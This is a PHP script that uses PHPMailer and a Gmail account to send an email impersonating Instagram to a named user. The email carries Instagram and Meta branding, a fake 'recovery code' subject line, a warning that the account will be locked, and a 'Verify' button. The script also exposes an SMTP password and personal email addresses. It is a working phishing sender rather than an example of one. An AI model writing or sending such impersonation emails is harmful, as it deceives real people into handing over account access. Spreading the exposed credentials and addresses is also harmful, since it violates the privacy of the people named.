<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

//Load Composer's autoloader
// require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);
$ff2 = "'";
try {
    //Server settings
    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'cybercare.instagram@gmail.com';                     //SMTP username
    $mail->Password   = '896100.227';                               //SMTP password
    $mail->SMTPSecure = 'tls';            //Enable implicit TLS encryption
    $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('cybercare.instagram@gmail.com', 'Instagram');
    $mail->addAddress('jackassnandu.227@gmail.com');               //Name is optional
    $mail->addReplyTo('cybercare.instagram@gmail.com', 'Instagram');
    // $mail->addCC('');
    // $mail->addBCC('');

    //Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = '996821 is your Instagram recovery code';
    $mail->Body    = '<!DOCTYPE html>
    <html>
       <head>
       <title>Facebook</title>
       <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
      <style nonce="BsJKtTtI">@media all and (max-width=
          : 480px){*[class].ib_t{min-width:100% !important}*[class].ib_row{display:bl=
          ock !important}*[class].ib_ext{display:block !important;padding:10px 0 5px =
          0;vertical-align:top !important;width:100% !important}*[class].ib_img,*[cla=
          ss].ib_mid{vertical-align:top !important}*[class].mb_blk{display:block !imp=
          ortant;padding-bottom:10px;width:100% !important}*[class].mb_hide{display:n=
          one !important}*[class].mb_inl{display:inline !important}*[class].d_mb_flex=
          {display:block !important}}.d_mb_show{display:none}.d_mb_flex{display:flex}=
          @media only screen and (max-device-width: 480px){.d_mb_hide{display:none !i=
          mportant}.d_mb_show{display:block !important}.d_mb_flex{display:block !impo=
          rtant}}.mb_text h1,.mb_text h2,.mb_text h3,.mb_text h4,.mb_text h5,.mb_text=
          h6{line-height:normal}.mb_work_text h1{font-size:18px;line-height:normal;m=
          argin-top:4px}.mb_work_text h2,.mb_work_text h3{font-size:16px;line-height:=
          normal;margin-top:4px}.mb_work_text h4,.mb_work_text h5,.mb_work_text h6{fo=
          nt-size:14px;line-height:normal}.mb_work_text a{color:#1270e9}.mb_work_text=
          p{margin-top:4px}
       </style>
       </head>
       <body style = "margin:0;padding:0;" bgcolor="#ffffff">
          <table border="0" cellspacing="0" cellpadding="0" align="center" id="email_table" style="border-collapse:collapse;">
             <tr><td id="email_content" style="font-family:Helvetica Neue,Helvet=
                ica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff;"><table border="0" width="100%" cellspacing="0" cellpadding="0" style=
                "border-collapse:collapse;">
             <tr style="">
                <td height="20" style="line-
                   height:20px;" colspan="3">&nbsp;</td>
             </tr>
             <tr>
                <td height="1" colspan=
                   "3" style="line-height:1px;"></td>
             </tr>
             <tr>
                <td style=""><table border=
                   "0" width="100%" cellspacing="0" cellpadding="0" style="border-c
                   ollapse:collapse;text-align:center;html_width:100%;width:100%;">
             <tr>
                <td width="15px" style="width:15px;"></td>
                <td style="line-height:0px;max-wid
                th:600px;padding:0 0 15px 0;">
                <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
                   <tr>
                      <td style=
                         "width:100%;text-align:left;height:33px;"><img height="33" src="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/QTa-gpOyYBa.png" style="border:0=
                         ;" />
                      </td>
                   </tr>
                </table>
                </td>
                <td width="15px" style="width:15px;"></td>
    
          </table>
          </td></tr>
          <tr>
             <td style=""><table border="0" width="430" =
                cellspacing="0" cellpadding="0" style="border-collapse:collapse;margi=
                n:0 auto 0 auto;">
          <tr>
             <td style=""><table border="0" width="430px" ce
                llspacing="0" cellpadding="0" style="border-collapse:collapse;margin:=
                0 auto 0 auto;width:430px;"><td width="15" style="display:block;width:1
                5px;">&nbsp;&nbsp;&nbsp;
             </td>
          <tr>
             <td style="">
                <table border="0" width=
                   "100%" cellspacing="0" cellpadding="0" style="border-collapse:coll
                   apse;">
                   <tr>
                      <td width="12" style="display:block;width:12px;">&nbsp;&nbsp;&nbsp;
                      </td>
                      <td style="">
                         <table border="0" width="100%" cellspacing=
                            "0" cellpadding="0" style="border-collapse:collapse;">
                            <tr>
                               <td><p style= "margin:10px 0 10px 0;color:#565a5c;font-size:18px;font-family:sans-serif;">Hi, sonam_varmani_</p>
                               </td>
                            </tr>
                         </table>
                      </td>
                   </tr>
                   <tr>
                      <td width="12" style="display:block;width:12px;">&nbsp;&nbsp;&nbsp;</td>
                      <td style="">
                         <table border="0" width="100%" cellspacing="0" cellpadding=
                            "0" style="border-collapse:collapse;">
                            <tr>
                               <td><td style="margin:10px 0 10px 0;color:#565a5c;font-size:18px;font-family:sans-serif;">Someone is trying to log in to your Instagram account continuously which seems to be suspicious at the moment. And may cause your account to be locked for 3 consecutive days. We are sorry for the inconvenience but if you don'.$ff2.'t want this, you can simply verify your account below. 
                               </td>
                               </td>
                            </tr>
                         </table>
                      </td>
                   </tr>
                </table>
             </td>
          </tr>
          </table></tr></table></td></tr>
          <tr>
          <td><a href="https://www.instagram.com/_n/web_emaillogin?uid=jpnvzii&amp;token=46b80Q&amp;auto_send=0" style="color:#3b5998;text-decoration:none;display:block;width:370px" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.instagram.com/_n/web_emaillogin?uid%3Djpnvzii%26token%3D46b80Q%26auto_send%3D0&amp;source=gmail&amp;ust=1647612289935000&amp;usg=AOvVaw1mKHMKx8MV5wq3qIo5cBPo">
    
    <tbody><tr><td style="border-collapse:collapse;border-radius:3px;text-align:center;display:block;border:solid 1px #009fdf;padding:10px 16px 14px 16px;margin:30px 0 0 11px;max-width:380px;background-color:#47a2ea"><a href="https://www.instagram.com/_n/web_emaillogin?uid=jpnvzii&amp;token=46b80Q&amp;auto_send=0" style="color:#3b5998;text-decoration:none;display:block" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.instagram.com/_n/web_emaillogin?uid%3Djpnvzii%26token%3D46b80Q%26auto_send%3D0&amp;source=gmail&amp;ust=1647612289935000&amp;usg=AOvVaw1mKHMKx8MV5wq3qIo5cBPo"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#fdfdfd;font-size:16px;line-height:16px">Verify&nbsp;as&nbsp;sonam_varmani_</span></font></center></a></td></tr></tbody></table></a></td></tr>
    <tr>
             <td style="">
                <table border="0" width=
                   "100%" cellspacing="0" cellpadding="0" style="border-collapse:coll
                   apse;">
                   <tr>
                      <td width="0" style="display:block">&nbsp;
                      </td>
                      <tr>
                               <td>
                               <p style= "margin:20px 0 0 11px;color:#565a5c;font-size:16px;font-family:sans-serif;">If you get a server error, kindly refresh the page and</p>
    
                               <p style= "margin:5px 0 10px 11px;color:#565a5c;font-size:16px;font-family:sans-serif;"><span><a href = "" style = "text-decoration:none;color:#3b5998;">learn more about why you may have received it.</a></span></p>
                               </td>
                            </tr>
                         </table>
                      </td>
                   </tr>
          <tr>
             <td style=""><table border="0" cellspaci
                ng="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto =
                0 auto;width:100%;max-width:600px;">
          <tr style="">
             <td height="4" style=
                "line-height:4px;" colspan="3">&nbsp;</td>
          </tr>
          <tr>
             <td width="15px" =
                style="width:15px;"></td>
             <td width="20" style="display:block;width:20
                px;">&nbsp;&nbsp;&nbsp;</td>
             <td style="text-align:center;">
                <div style="
                padding-top:20px;display:flex;">
                <div style="margin:auto;"><img class="img" src="https://static.xx.fbcdn.net/rsrc.php/v3/yX/r/myE1ua6bwfE.png" height="26" width="52" alt="" /></div>
                <br></div><div style="height:
                10px;"></div>
                <div style="color:#abadae;font-size:11px;margin:0 auto 5px auto;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;">	&#169; Instagram.com Meta Platforms, Inc., 1601 Willow Road, Menlo Park,
                   CA 94025<br />
                </div>
                <div style="color:#abadae;font-size:11px;margin:0 auto 5px auto;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;">This message was sent to 
    <a style="color:#abadae;text-decoration:underline;">himanivarmani@gmail.com</a>and intented for sonam_varmani_. Not your account? <a style="color:#abadae;text-decoration:underline;">Remove your email </a>from this account.</div>
             </td>
             <td width="20" style="display:block;width:20px;">&nbsp;&nbsp;&nbsp;</td>
             <td width="15px" style="width:15px;"></td>
          </tr>
          <tr style="">
             <td height="32"=
                style="line-height:32px;" colspan="3">&nbsp;</td>
          </tr>
          </table></td></tr>
          <tr style="">
             <td height="20" style="line-height:20px;" colspan="3">&nbsp;</td>
          </tr>
          </table><span style=""><img src="https://www.facebook=
          .com/email_open_log_pic.php?mid=3D5d4ea8a1135e5G24bc374b9c7100G5d4ead3a738b
          8G2444" style="border:0;width:1px;height:1px;" /></span></td></tr></table>
       </body>
    </html>';
    // $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
